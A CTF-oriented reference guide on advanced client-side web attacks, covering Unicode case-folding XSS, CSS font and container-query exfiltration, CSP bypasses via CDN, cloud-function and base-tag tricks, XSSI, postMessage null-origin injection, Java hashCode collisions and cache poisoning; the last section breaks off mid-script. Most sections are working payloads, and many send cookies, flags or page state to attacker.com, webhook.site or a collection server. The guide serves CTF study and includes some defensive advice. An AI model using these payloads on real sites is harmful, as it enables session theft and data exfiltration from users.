# CTF Web - Advanced Client-Side Attacks

Unicode bypass, CSS-only exfiltration, behavioral JS frameworks, timing oracles, HMAC bypass, CSP bypasses, and XSSI techniques.

## Table of Contents
- [Unicode Case Folding XSS Bypass (UNbreakable 2026)](#unicode-case-folding-xss-bypass-unbreakable-2026)
- [CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026)
- [Hyperscript CDN CSP Bypass (UNbreakable 2026)](#hyperscript-cdn-csp-bypass-unbreakable-2026)
- [PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)](#pbkdf2-prefix-timing-oracle-via-postmessage-unbreakable-2026)
- [Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)](#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013)
- [Terminal Control Character Obfuscation (SECCON 2015)](#terminal-control-character-obfuscation-seccon-2015)
- [CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)](#csp-bypass-via-cloud-function-whitelisted-domain-bsidessf-2025)
- [CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)](#csp-nonce-bypass-via-base-tag-hijacking-bsidessf-2026)
- [XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)](#xssi-via-jsonp-callback-with-cloud-function-exfiltration-bsidessf-2026)
- [CSP Bypass via link prefetch (Boston Key Party 2016)](#csp-bypass-via-link-prefetch-boston-key-party-2016)
- [Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)](#cross-origin-xss-via-shared-parent-domain-cookie-injection-0ctf-2017)
- [Chrome Unicode URL Normalization Bypass (RCTF 2017)](#chrome-unicode-url-normalization-bypass-rctf-2017)
- [XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)](#xss-dot-filter-bypass-via-decimal-ip-and-bracket-notation-33c3-ctf-2016)
- [XSS via Referer Header Injection (Tokyo Westerns 2017)](#xss-via-referer-header-injection-tokyo-westerns-2017)
- [Java hashCode() Collision for Auth Bypass (CSAW 2017)](#java-hashcode-collision-for-auth-bypass-csaw-2017)
- [CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)](#css-font-face-unicode-range-data-exfiltration-harekaze-ctf-2018)
- [postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)](#postmessage-null-origin-bypass-via-data-uri-iframe-backdoorctf-2018)
- [CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)](#csp-bypass-via-attacker-controlled-mime-type-for-same-origin-scripts-midnight-sun-ctf-finals-2018)
- [React Component State Extraction via __reactInternalInstance$ (RCTF 2018)](#react-component-state-extraction-via-__reactinternalinstance-rctf-2018)
- [CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)](#cloudflare-cache-poisoning-via-js-username--stored-self-xss-confidence-2019-teaser)

---

## Unicode Case Folding XSS Bypass (UNbreakable 2026)

**Pattern (demolition):** Server-side sanitizer (Flask regex `<\s*/?\s*script`) only matches ASCII. A second processing layer (Go `strings.EqualFold`) applies Unicode case folding, which canonicalizes `ſ` (U+017F, Latin Long S) to `s`.

**Payload:**
```html
<ſcript>location='https://webhook.site/ID?c='+document.cookie</ſcript>
```

**How it works:**
1. Flask regex checks for `<script` -- `<ſcript` does not match (ſ ≠ s in ASCII regex)
2. Go's `strings.EqualFold` canonicalizes `ſ` to `s`, treating `<ſcript>` as `<script>`
3. Frontend inserts via `innerHTML` -- browser parses the now-valid script tag

**Other Unicode folding pairs for bypass:**
- `ſ` (U+017F) -> `s` / `S`
- `ı` (U+0131) -> `i` / `I`
- `ﬁ` (U+FB01) -> `fi`
- `K` (U+212A, Kelvin sign) -> `k` / `K`

**Key insight:** Different layers applying different normalization standards (ASCII-only regex vs. Unicode-aware case folding) create bypass opportunities. Check what processing each layer applies.

---

## CSS Font Glyph Width + Container Query Exfiltration (UNbreakable 2026)

**Pattern (larpin):** Exfiltrate inline script content (e.g., `window.__USER_CONFIG__`) via CSS injection without JavaScript execution. Uses custom font glyph widths and CSS container queries as an oracle.

**Technique:**
1. **Target selection** -- CSS selector targets inline script: `script:not([src]):has(+script[src*='purify'])`
2. **Custom font** -- Each character glyph has a unique advance width: `width = (char_index + 1) * 1536` font units
3. **Container query oracle** -- Wrapping element uses `container-type: inline-size`. Container queries match specific width ranges to trigger background-image requests:
```css
@container (min-width: 150px) and (max-width: 160px) {
  .probe { background: url('https://attacker.com/?char=a&pos=0'); }
}
```
4. **Per-character probing** -- Iterate positions, each probe narrows to one character based on measured width

**Key insight:** CSS container queries (no JavaScript needed) combined with custom font metrics create a pixel-perfect oracle for text content. Works even under strict CSP that blocks all scripts.

---

## Hyperscript CDN CSP Bypass (UNbreakable 2026)

**Pattern (minegamble):** CSP allows `cdnjs.cloudflare.com` scripts. Hyperscript (`_hyperscript`) processes `_=` attributes client-side after HTML sanitization, enabling post-sanitization code execution.

**Payload:**
```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/hyperscript/0.9.12/hyperscript.min.js"></script>
<div _="on load fetch '/api/ticket' then put document.cookie into its body"></div>
```

**How it works:**
1. HTML passes sanitizer (no inline script, no event handlers)
2. Hyperscript library loads from CDN (allowed by CSP)
3. Hyperscript scans DOM for `_=` attributes and executes them as behavioral directives
4. `on load` triggers arbitrary actions including fetch, DOM manipulation, cookie access

**Key insight:** Hyperscript, Alpine.js (`x-data`, `x-init`), htmx (`hx-get`, `hx-trigger`), and similar declarative JS frameworks execute code from HTML attributes that sanitizers don't recognize. If any CDN-hosted behavioral framework is CSP-allowed, it bypasses both CSP and HTML sanitizers.

---

## PBKDF2 Prefix Timing Oracle via postMessage (UNbreakable 2026)

**Pattern (svfgp):** Server checks `secret.startsWith(candidate)` where verification involves expensive PBKDF2 (3M iterations). Mismatches return fast; matches run the full KDF, creating a measurable timing difference.

**Exfiltration via postMessage:**
1. Open target page in a popup
2. For each character position, probe all candidates (`a-z0-9_}`)
3. Measure round-trip time via `postMessage` / response timing
4. Highest-latency character = correct prefix match

```javascript
async function probeChar(known, candidates) {
  const timings = {};
  for (const c of candidates) {
    const start = performance.now();
    // Navigate popup to verification endpoint with candidate prefix
    popup.location = `${TARGET}/verify?prefix=${known}${c}`;
    await waitForResponse();  // postMessage or load event
    timings[c] = performance.now() - start;
  }
  return Object.entries(timings).sort((a, b) => b[1] - a[1])[0][0];
}
```

**Key insight:** Any expensive server-side operation (PBKDF2, bcrypt, Argon2) guarded by a short-circuit prefix check creates a timing oracle. The `startsWith` fast-fail vs. full-KDF timing difference is measurable cross-origin via popup navigation timing.

---

## Client-Side HMAC Bypass via Leaked JS Secret (Codegate 2013)

**Pattern:** Application builds request URLs client-side with an HMAC parameter. The secret key is hardcoded in obfuscated JavaScript.

**Attack steps:**
1. Deobfuscate client-side JS (jsbeautifier.org or browser DevTools pretty-print)
2. Locate the signing function and extract the hardcoded secret
3. Use the leaked function directly in browser console to forge valid signatures for arbitrary requests

```javascript
// Discovered in deobfuscated main.js:
function buildUrl(page) {
    var sig = calcSHA1(page + "Ace in the Hole");  // Hardcoded secret
    return "/load?p=" + page + "&s=" + sig;
}

// Exploit: call the leaked global function in browser console
var forgedUrl = "/load?p=index.php&s=" + calcSHA1("index.php" + "Ace in the Hole");
// Fetching index.php via the p parameter returns raw PHP source code
```

**Key insight:** Client-side HMAC/signature schemes leak the secret by definition -- the signing key must be present in the JavaScript. Deobfuscate the JS, extract the secret, then forge signatures for any parameter value. Check for global functions like `calcSHA1`, `hmac`, `sign` in the browser console.

---

## Terminal Control Character Obfuscation (SECCON 2015)

Server responses may hide data using ASCII backspace (0x08) characters. The terminal renders `S\x08 ` as a space (overwrites 'S'), making the flag invisible in normal display. Extract by reading raw bytes:

```python
import socket
s = socket.socket()
s.connect((host, port))
data = s.recv(4096)
flag = data.replace(b'\x08', b'').replace(b' ', b'')
# Or: filter only printable chars that aren't followed by backspace
```

---

## CSP Bypass via Cloud Function Whitelisted Domain (BSidesSF 2025)

When Content-Security-Policy whitelists cloud platform domains (e.g., `*.us-central1.run.app`, `*.cloudfunctions.net`, `*.azurewebsites.net`):

1. Deploy a malicious script to the whitelisted cloud platform
2. Load it via `<script src="https://your-func-xxxxx.us-central1.run.app">` -- passes CSP
3. Exfiltrate data from the vulnerable page

```python
# Google Cloud Function that serves exfiltration JS
def serveIt(request):
    js = """
    var xhr = new XMLHttpRequest();
    xhr.open('GET', location.origin + '/admin/secret', true);
    xhr.onload = function() {
        fetch('https://attacker.com/log?flag=' + encodeURIComponent(xhr.responseText));
    };
    xhr.send(null);
    """
    return (js, 200, {'Content-Type': 'application/javascript',
                       'Access-Control-Allow-Origin': '*'})
```

Deploy with `gcloud functions deploy serveIt --runtime python39 --trigger-http --allow-unauthenticated`.

**Key insight:** Cloud platform domains are shared infrastructure. Whitelisting `*.run.app` or `*.cloudfunctions.net` in CSP allows any attacker-deployed function to serve scripts. Prefer `nonce-based` or `hash-based` CSP over domain whitelists for cloud-hosted applications.

---

## CSP Nonce Bypass via base Tag Hijacking (BSidesSF 2026)

**Pattern (web-tutorial-2):** CSP uses `script-src 'nonce-xxx'` to restrict script execution to nonced scripts. However, the CSP is missing the `base-uri` directive. If you can inject HTML before a nonced script that loads from a relative URL, inject a `<base>` tag to redirect the relative URL to your server.

**Vulnerable CSP:**
```text
Content-Security-Policy: script-src 'nonce-abc123'; default-src 'self'
```
Notice: no `base-uri` directive.

**Vulnerable page HTML:**
```html
<!-- Attacker injects here via stored XSS, parameter injection, etc. -->
<base href="https://attacker.com/">
<!-- ... later in the page ... -->
<script nonce="abc123" src="test.js"></script>
```

**How it works:**
1. The `<base href="https://attacker.com/">` tag changes the base URL for all relative URLs on the page
2. When the browser encounters `<script nonce="abc123" src="test.js">`, it resolves `test.js` relative to the new base -> `https://attacker.com/test.js`
3. The script has a valid nonce, so CSP allows it
4. The script loads from the attacker's server, executing arbitrary JavaScript

**Exploit setup:**
```python
# Host malicious test.js on attacker server
# test.js content:
"""
fetch('/api/flag')
  .then(r => r.text())
  .then(f => fetch('https://webhook.site/YOUR_ID?flag=' + encodeURIComponent(f)));
"""
```

**Injection payload:**
```html
<base href="https://attacker.com/">
```

**Key insight:** The `<base>` tag affects ALL relative URLs on the page, including nonced scripts. CSP `script-src 'nonce-xxx'` only validates that the nonce matches -- it does NOT restrict where the script is loaded from (that would require `script-src` with domain restrictions). Without `base-uri 'self'` or `base-uri 'none'` in the CSP, any HTML injection point before a relative-URL nonced script enables full CSP bypass.

**Defense:** Always include `base-uri 'self'` or `base-uri 'none'` in CSP policies that use nonces. This prevents `<base>` tag injection from redirecting script sources.

**Detection:** Check CSP for `script-src 'nonce-...'` combined with missing `base-uri` directive. Look for nonced `<script src="relative.js">` tags (relative URL, not absolute) that appear after a potential injection point.

**References:** BSidesSF 2026 "web-tutorial-2"

---

## XSSI via JSONP Callback with Cloud Function Exfiltration (BSidesSF 2026)

**Pattern (three-questions-3):** Multi-stage attack chain:
1. **Cookie hash inversion:** User ID cookie is `SHA1(numeric_id)` where ID is a small integer (1-100000). Brute-force the hash to recover the numeric ID.
2. **IDOR on debug endpoint:** `/debug/game-state?user_id=<numeric_id>` returns game state (discovered via HTML comments + robots.txt).
3. **XSSI exfiltration:** The admin's game state is exfiltrated via Cross-Site Script Inclusion. A JSONP-like endpoint (`/characters.js?callback=leak`) wraps response data in a function call. Inject a `<script src>` tag via an admin message feature that loads this endpoint with a custom callback, which forwards the data to an attacker-controlled cloud function.

```html
<!-- Injected via /admin-message endpoint -->
<script>
function leak(data) {
    // Exfiltrate to attacker's cloud function
    new Image().src = "https://attacker.cloudfunctions.net/exfil?d=" +
        encodeURIComponent(JSON.stringify(data));
}
</script>
<script src="/characters.js?callback=leak"></script>
```

```python
# Step 1: Brute-force SHA1 cookie to recover numeric user ID
import hashlib

cookie_hash = "a1b2c3d4..."  # From document.cookie
for i in range(1, 100001):
    if hashlib.sha1(str(i).encode()).hexdigest() == cookie_hash:
        print(f"User ID: {i}")
        break

# Step 2: Access debug endpoint
# GET /debug/game-state?user_id={recovered_id}
```

**Key insight:** XSSI (Cross-Site Script Inclusion) exploits endpoints that return JavaScript (JSONP callbacks, JS variable assignments) containing sensitive data. Unlike XSS, XSSI doesn't require injecting script into the target page -- it loads the target's script cross-origin. The `callback` parameter in JSONP endpoints is the classic vector. Combined with an admin bot that visits attacker-controlled pages, this enables server-side data exfiltration.

**When to recognize:** Application has JSONP endpoints or serves JavaScript files with dynamic data. CSP may allow `script-src` from same origin. Look for `?callback=` or `?jsonp=` parameters. The attack chain typically combines: weak cookie hashing -> IDOR -> XSSI -> OOB exfiltration.

**Defense:** Disable JSONP/callback parameters. Return `Content-Type: application/json` (not `application/javascript`). Add `X-Content-Type-Options: nosniff`. Use CORS properly instead of JSONP.

---

## CSP Bypass via link prefetch (Boston Key Party 2016)

`<link rel="prefetch">` is not blocked by CSP `script-src` directives, enabling scriptless data exfiltration:

```html
<link rel="prefetch" href="http://attacker.com/steal?data=SECRET">
<meta http-equiv="refresh" content="0; url=http://attacker.com/steal">
```

**Key insight:** CSP restricts script execution but not navigation or resource prefetch. Use `<link rel="prefetch">` or `<meta http-equiv="refresh">` for scriptless exfiltration when XSS is possible but `script-src` blocks inline/remote JS. Data is sent via URL parameters or the `Referer` header.

---

## Cross-Origin XSS via Shared Parent Domain Cookie Injection (0CTF 2017)

**Pattern (complicated xss):** When an attacker-accessible page and the XSS target share a second-level domain (e.g., `user.example.vip` and `admin.example.vip`), cookies set with `domain=.example.vip` are sent to both subdomains. Inject an XSS payload via a cookie value on the attacker-accessible page, then redirect the victim to the admin interface where the cookie renders as XSS.

```javascript
// On attacker-accessible subdomain: set cookie for shared parent domain
document.cookie = 'username=<script src=//example.invalid/payload.js></script>; path=/; domain=.example.invalid;';
// Redirect victim to admin interface on sibling subdomain
window.top.location = 'http://admin.example.invalid:8000';

// In payload.js: bypass sandbox by stealing XMLHttpRequest from iframe
var iframe = document.createElement('iframe');
iframe.src = 'about:blank';
document.body.appendChild(iframe);
window.XMLHttpRequest = iframe.contentWindow.XMLHttpRequest;
// Now use restored XMLHttpRequest to exfiltrate admin data
```

**Key insight:** Domain-scoped cookies cross subdomain boundaries. If any subdomain reflects cookie values without sanitization, setting a malicious cookie from a different subdomain achieves XSS on the target. The iframe trick restores `XMLHttpRequest` when the sandbox environment overrides it.

---

## Chrome Unicode URL Normalization Bypass (RCTF 2017)

**Pattern:** Chrome normalizes certain Unicode characters to ASCII equivalents during URL processing (IDNA/punycode normalization). This can bypass length restrictions or character filters imposed by the application on domain names or URL components.

**Fuzzing for Unicode-to-ASCII mappings:**
```python
# Fuzz Unicode chars that Chrome normalizes to specific ASCII
import unicodedata

target_char = 'a'  # Find Unicode chars that normalize to 'a'
results = []
for cp in range(0x100, 0xffff):
    c = chr(cp)
    # NFKC normalization (what browsers use for IDNA)
    normalized = unicodedata.normalize('NFKC', c)
    if normalized == target_char:
        results.append(f"U+{cp:04X} ({c}) -> {target_char}")

for r in results:
    print(r)
```

**Known useful mappings:**
```text
# Characters that normalize to ASCII equivalents:
U+FF41 (ａ) -> a    # Fullwidth Latin Small Letter A
U+FF42 (ｂ) -> b    # Fullwidth Latin Small Letter B
...
U+FF5A (ｚ) -> z    # Fullwidth Latin Small Letter Z
U+2100 (℀) -> a/c   # Account Of
U+2101 (℁) -> a/s   # Addressed to the Subject
U+FF0F (／) -> /    # Fullwidth Solidus
U+FF1A (：) -> :    # Fullwidth Colon
```

**Exploit scenario:**
```python
# Application enforces max 6-character domain
# Unicode domain uses 6 chars but normalizes to 8+ ASCII chars
unicode_domain = "\uff41\uff42\uff43\uff44\uff45\uff46"  # 6 fullwidth chars
# Chrome normalizes to: "abcdef" (6 ASCII chars)
# But some checks see: 6 Unicode code points

# Bypass character filter on domain
# Application blocks 'x' in domain names
# Use fullwidth 'ｘ' (U+FF58) instead
url = "http://e\uff58ample.com/payload"
# Chrome normalizes to http://example.com/payload
```

**Key insight:** Chrome's IDNA/punycode normalization converts certain Unicode characters to ASCII equivalents. A 6-character Unicode domain may resolve to an 8-character ASCII domain, bypassing length checks imposed by the application. Fullwidth Latin characters (U+FF00-U+FF5E) are particularly useful as they have 1:1 ASCII mappings. This applies to any client-side URL validation that doesn't apply the same normalization as the browser.

---

## XSS Dot-Filter Bypass via Decimal IP and Bracket Notation (33C3 CTF 2016)

**Pattern (yoso):** When an XSS filter strips dots from URLs (blocking `attacker.com` and `document.cookie`), bypass using: (1) Convert IP addresses to decimal format (`92.123.45.67` → single integer), eliminating all dots from the URL. (2) Use JavaScript bracket notation for property access: `window["location"]`, `document["cookie"]`. (3) Use `"str"["concat"]()` instead of the `+` operator for string concatenation.

```html
<!-- Filter blocks dots, breaking: document.cookie, attacker.com -->
<!-- Bypass: decimal IP + bracket notation -->
<script>
  window["location"] = "http://1558071511/"["concat"](document["cookie"])
</script>

<!-- Decimal IP conversion: -->
<!-- 92*256^3 + 123*256^2 + 45*256 + 67 = 1558071511 -->
<!-- http://1558071511/ resolves to 92.123.45.67 -->
```

**Key insight:** Decimal IP addresses are valid in URLs and contain no dots. Combined with JavaScript's bracket notation (which uses string keys instead of dot access), this bypasses any filter that targets the dot character.

---

## XSS via Referer Header Injection (Tokyo Westerns 2017)

**Pattern:** The HTTP `Referer` header is reflected into a `<meta http-equiv="refresh">` tag (or other HTML context) without sanitization, enabling XSS. Combined with WebRTC ICE candidate leakage, this enables discovery of the server's internal IP for subsequent SSRF to localhost-restricted endpoints.

```html
<!-- Vulnerable page template — Referer header reflected verbatim: -->
<meta http-equiv="refresh" content="0; url=REFERER_VALUE">

<!-- Inject XSS by sending a crafted Referer: -->
<!-- Referer: javascript:alert(document.cookie) -->
<!-- Produces: <meta http-equiv="refresh" content="0; url=javascript:alert(document.cookie)"> -->
```

```python
import requests

TARGET = "http://target/page"

# Step 1: XSS via Referer in meta refresh context
xss_payload = "javascript:fetch('https://attacker.com/?c='+document.cookie)"
r = requests.get(TARGET, headers={"Referer": xss_payload})
# If target reflects Referer into meta refresh, victim browser executes the JS
```

**Combining with WebRTC internal IP leak:**
```javascript
// WebRTC ICE candidates leak internal IPs without user interaction
// Inject this payload to discover internal network topology
var pc = new RTCPeerConnection({
    iceServers: [{urls: "stun:stun.l.google.com:19302"}]
});
pc.createDataChannel("");
pc.createOffer().then(o => pc.setLocalDescription(o));
pc.onicecandidate = function(ice) {
    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
    // Candidate string contains internal IP: "192.168.x.x" or "10.x.x.x"
    fetch('https://attacker.com/?ip=' + encodeURIComponent(ice.candidate.candidate));
};
```

```bash
# Full attack chain:
# 1. Find page that reflects Referer without sanitization
curl -v -H "Referer: test_marker" http://target/page 2>&1 | grep "test_marker"

# 2. Inject XSS payload that runs WebRTC to leak internal IP
# 3. Use leaked internal IP for SSRF to localhost:80 or internal services
# e.g., http://192.168.1.1/admin — accessible only from internal network
```

**Key insight:** The `Referer` header is rarely sanitized because it's not considered "user input" in the traditional sense. When reflected into `<meta refresh>`, `<script>`, or URL attributes, it enables XSS. WebRTC `RTCPeerConnection` ICE candidates leak internal IPs without any user interaction or special permissions — useful for mapping internal networks after initial XSS.

---

## Java hashCode() Collision for Auth Bypass (CSAW 2017)

**Pattern:** Java's `String.hashCode()` uses a 31-based polynomial rolling hash with 32-bit integer overflow. The small keyspace and simple structure make finding collisions trivial. When an application uses `hashCode()` for password comparison or token validation, forge a colliding string.

```java
// Java hashCode formula:
// h = 0
// for each char c: h = 31 * h + c  (with 32-bit overflow)

// Vulnerable authentication:
if (password.hashCode() == storedHash) {
    grantAccess();   // WRONG: hashCode collisions trivially found
}
```

```python
def java_hashcode(s):
    """Replicate Java's String.hashCode() in Python."""
    h = 0
    for c in s:
        h = (31 * h + ord(c)) & 0xFFFFFFFF
    # Handle Java's signed 32-bit integer behavior
    if h >= 0x80000000:
        h -= 0x100000000
    return h

# Verify: known collision pair
target = "Pas$ion"
assert java_hashcode("ParDJon") == java_hashcode(target)
print(f"hashCode('ParDJon') = {java_hashcode('ParDJon')}")
print(f"hashCode('Pas$ion') = {java_hashcode(target)}")
# Both return the same value

# Find collisions for an arbitrary target string:
target_hash = java_hashcode("secretPassword")

# Brute-force short strings:
import itertools, string
charset = string.printable.strip()
for length in range(4, 9):
    for candidate in itertools.product(charset, repeat=length):
        s = ''.join(candidate)
        if java_hashcode(s) == target_hash:
            print(f"Collision found: '{s}'")
            break
```

**Known collision pairs:**
```text
"Aa"   == "BB"        (hashCode = 2112)
"AaBB" == "BBAa"      (longer collision)
"ParDJon" == "Pas$ion"
```

**Systematic collision generation:**
```python
# For any two characters a, b where ord(a)*31 + ord(b) == ord(c)*31 + ord(d):
# The strings ending in "ab" and "cd" will have the same hash contribution
# Exploit: find char pairs with equal (31*h + ord(c)) mod 2^32

# Quick collision finder for 2-char suffix:
def find_collision(target_str):
    target_h = java_hashcode(target_str)
    for c1 in range(32, 127):
        for c2 in range(32, 127):
            candidate = target_str[:-1] + chr(c1) + chr(c2)
            # ... adjust prefix to match hash
    pass
```

**Key insight:** Java `hashCode()` produces trivial collisions due to its simple polynomial structure and 32-bit overflow. Never use it for security-sensitive comparisons (passwords, tokens, signatures). The collision space is dense — for most hash values, many short colliding strings exist. Use `hashCode()` only for hash table bucket assignment, never for equality/authentication checks.

**Detection:** Java source using `password.hashCode() == storedHash`, token comparison via `token.hashCode()`, or any security check using `.hashCode()` instead of `equals()` with a secure hash (bcrypt, PBKDF2, etc.).

---

## CSS @font-face unicode-range Data Exfiltration (Harekaze CTF 2018)

**Pattern:** Define a custom `@font-face` per character with a `unicode-range` that matches exactly one code point. When a headless browser (or admin bot) renders an element containing the target text, the browser fetches a different font URL for each character actually present. The attacker's server logs reveal which characters exist in the target element.

```css
/* Each @font-face triggers a fetch only if that character exists in .target */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=a'); unicode-range: U+0061; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=b'); unicode-range: U+0062; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=c'); unicode-range: U+0063; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=0'); unicode-range: U+0030; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=1'); unicode-range: U+0031; }
/* ... one per character in the target alphabet ... */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=_'); unicode-range: U+005F; }
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7B'); unicode-range: U+007B; } /* { */
@font-face { font-family: exfil; src: url('http://attacker.com/leak?c=%7D'); unicode-range: U+007D; } /* } */

/* Apply the font to the element containing the secret */
.target { font-family: exfil; }
```

```python
# Generate the full @font-face CSS payload
import string

charset = string.ascii_lowercase + string.digits + "_{}"
css_rules = []
for c in charset:
    code_point = f"U+{ord(c):04X}"
    encoded_c = c if c.isalnum() else f"%{ord(c):02X}"
    css_rules.append(
        f"@font-face {{ font-family: exfil; "
        f"src: url('http://attacker.com/leak?c={encoded_c}'); "
        f"unicode-range: {code_point}; }}"
    )
css_rules.append(".target { font-family: exfil; }")
payload = "\n".join(css_rules)

# Host as CSS file — MUST serve with Content-Type: text/css for cross-origin
# Inject via: <link rel="stylesheet" href="http://attacker.com/exfil.css">
# Or via CSS injection: <style>@import url('http://attacker.com/exfil.css');</style>
```

```python
# Server-side: collect leaked characters
from flask import Flask, request

app = Flask(__name__)
leaked_chars = set()

@app.route('/leak')
def leak():
    c = request.args.get('c', '')
    leaked_chars.add(c)
    print(f"Leaked chars so far: {''.join(sorted(leaked_chars))}")
    # Return a minimal valid font file (or 404 — the request itself is the leak)
    return '', 204

app.run(host='0.0.0.0', port=80)
```

**Limitations and workarounds:**
```text
# unicode-range leaks character SET, not order or count
# Leaked: {a, c, f, g, l, _} from "flag_cfg" — no positional info

# To recover ordering, combine with CSS positional tricks:
# 1. Use ::first-letter with a unique font to leak position 1
# 2. Use text-indent + overflow: hidden tricks to isolate characters
# 3. Chain with :nth-child selectors if target chars are in separate elements
```

**Key insight:** CSS `@font-face` with `unicode-range` triggers font fetches only for characters actually present in the target element. Works under strict CSP that blocks scripts but allows `style-src`. Cross-origin CSS must include `Content-Type: text/css`. Leaks character set (not order), so combine with positional CSS tricks if ordering matters. See also the [CSS Font Glyph Width + Container Query Exfiltration](#css-font-glyph-width--container-query-exfiltration-unbreakable-2026) technique for a more precise CSS-only oracle.

---

### postMessage Null Origin Bypass via data URI Iframe (BackdoorCTF 2018)

**Pattern:** When a web application validates `postMessage` origins, a `data:` URI iframe has a `null` origin that bypasses same-origin checks. Many postMessage handlers check `event.origin !== expected` but don't account for `null` origins, allowing injection from a sandboxed context.

**Vulnerable handler pattern:**
```javascript
// Target application's message handler:
window.addEventListener('message', function(event) {
    // Weak origin check — doesn't handle null origin
    if (event.origin === 'http://trusted.com' || !event.origin) {
        // Process message — renders user-controlled HTML/JS
        document.getElementById('content').innerHTML = event.data.details.sender_username;
    }
});
```

**Exploit via data: URI iframe:**
```html
<iframe src="data:text/html,<script>
var w = window.open('http://target/page');
setTimeout(function(){
    w.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
}, 1000);
</script>"></iframe>
```

**Alternative: sandboxed iframe approach:**
```html
<!-- sandbox attribute without allow-same-origin also produces null origin -->
<iframe sandbox="allow-scripts" srcdoc="
<script>
    parent.postMessage({type:'audio', details:{
        sender_username:'<img src=x onerror=fetch(`http://attacker/`+document.cookie)>'}
    }, '*');
</script>
"></iframe>
```

```python
# Host the exploit page on attacker server
exploit_html = '''
<html><body>
<iframe src="data:text/html,
<script>
var w = window.open('http://target/messages');
setTimeout(function(){
    w.postMessage({
        type: 'audio',
        details: {
            sender_username: '<img src=x onerror=fetch(`http://attacker.com/steal?c=`+document.cookie)>'
        }
    }, '*');
}, 1500);
</script>
"></iframe>
</body></html>
'''
# Serve this page, then send the URL to the admin bot
```

**Key insight:** `data:` URI iframes have a `null` origin. Many postMessage handlers check `event.origin !== expected` but don't account for null origins, allowing injection from a sandboxed context. The `sandbox` attribute without `allow-same-origin` also produces a `null` origin. Always test postMessage handlers with `null` origin by using `data:` URIs or sandboxed iframes. The fix is to explicitly reject `null` and empty origins: `if (!event.origin || event.origin === 'null') return;`.

---

## CSP Bypass via Attacker-Controlled Mime Type for Same-Origin Scripts (Midnight Sun CTF Finals 2018)

**Pattern (Mimisbrunnr):** Endpoint `/xss?xss=<payload>&mimis=<mime>` echoes `payload` with an attacker-chosen `Content-Type`. CSP is `script-src 'self'` and `X-Content-Type-Options: nosniff` is set, so normal XSS injection is blocked. But by choosing `mimis=application/javascript` (or Chrome's permissive `jscript`), the same-origin response becomes loadable as a script via `<script src="/xss?...&mimis=jscript">`.

**Exploit:**
```html
<!-- Served by attacker's XSS injection point (another endpoint on the same origin) -->
<script src="/xss?xss=function%20WELCOME(){};var%20oooooo=0;/*&mimis=jscript"></script>
<script src="/xss?xss=*/payload;//&mimis=jscript"></script>
```
- The first request smuggles harmless tokens that also open a block comment (`/*`).
- The second request closes the comment (`*/`) and runs the real payload.
- Because both responses come from `self`, `script-src 'self'` is satisfied even though the browser would normally have rejected them for having a different Content-Type without `nosniff`.

**Key insight:** `X-Content-Type-Options: nosniff` stops MIME sniffing, but it does not override a Content-Type that the server itself declares. Any endpoint whose response type is attacker-controlled — even indirectly, via a query param or `Accept` header — is effectively a script gadget under `script-src 'self'`. Block this by hard-coding the `Content-Type` for reflected endpoints and never echoing user input into headers.

**References:** Midnight Sun CTF Finals 2018 — writeup 10258

---

## React Component State Extraction via __reactInternalInstance$ (RCTF 2018)

**Pattern:** XSS on a React-rendered page cannot directly read server-side state, but every DOM node managed by React carries a property named `__reactInternalInstance$<random>` that links back to the React Fiber node. From there, `.return.stateNode.state` (or `.memoizedState` in newer versions) exposes component state that was never serialized into HTML.

**Exfiltration payload:**
```javascript
const key = Object.keys(document.querySelector('[data-react-root]'))
  .find(k => k.startsWith('__reactInternalInstance$'));
const fiber = document.querySelector('[data-react-root]')[key];
const state = fiber.return.stateNode.state;
fetch('https://attacker.example/log?s=' + encodeURIComponent(JSON.stringify(state)));
```

For React 17+ the property name is `__reactFiber$<random>`, and the path is `.stateNode.memoizedState`. Walk `.return` until you hit a node with `stateNode !== null`.

**Key insight:** React stores component state on the DOM itself for hot-reload and devtools support. XSS within the same document therefore has full read access to props and state, including values that were fetched client-side and never echoed into the markup (auth tokens, private chats, admin panels). Harden dev builds by stripping `__reactFiber$`/`__reactInternalInstance$` attachments in production or by preventing XSS upstream — CSP alone is not enough because the state read happens in JavaScript that CSP already permits.

**References:** RCTF 2018 — writeup 10125

---

## CloudFlare Cache Poisoning via .js Username + Stored Self-XSS (CONFidence 2019 Teaser)

**Pattern:** Profile page has a stored self-XSS (e.g. attribute injection on a `<select>` `shoesize` field via `tabindex=1 contenteditable autofocus onfocus=...`). Self-XSS alone is useless — the XSS only fires for the owner of the profile. CDN caches by URL extension, not `Content-Type`, so registering a username whose URL ends in `.js` makes the CDN treat `/profile/<user>.js` as a cacheable static JS asset. A single logged-in hit from the attacker's session poisons the shared edge cache: every subsequent visitor — including the challenge admin bot — is served the attacker's authenticated HTML, executing the XSS under the victim's session.

```python
# 1. Pick a region-matching VM so your cache hits land in the admin's region.
#    (CloudFlare is region-sharded; colocate with other challenge infra.)

# 2. Register a user whose name ends in .js
import requests, random
s = requests.Session()
s.get('http://target/login')
user = f'hfs-{random.randint(10**7, 10**8)}.js'
s.post('http://target/login', data=f'login={user}&password={user}',
       headers={'Content-Type': 'application/x-www-form-urlencoded'})

